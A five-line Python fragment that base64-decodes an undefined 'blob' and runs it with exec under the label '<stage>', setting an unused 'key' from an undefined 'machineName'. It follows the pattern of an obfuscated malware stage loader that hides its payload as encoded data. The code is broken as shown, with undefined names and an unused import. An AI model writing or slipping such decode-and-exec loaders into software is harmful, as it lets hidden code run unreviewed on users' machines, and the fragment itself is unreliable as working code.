import base64
import hashlib
key = machineName
code = base64.b64decode(blob)
exec(compile(code, '<stage>', 'exec'))
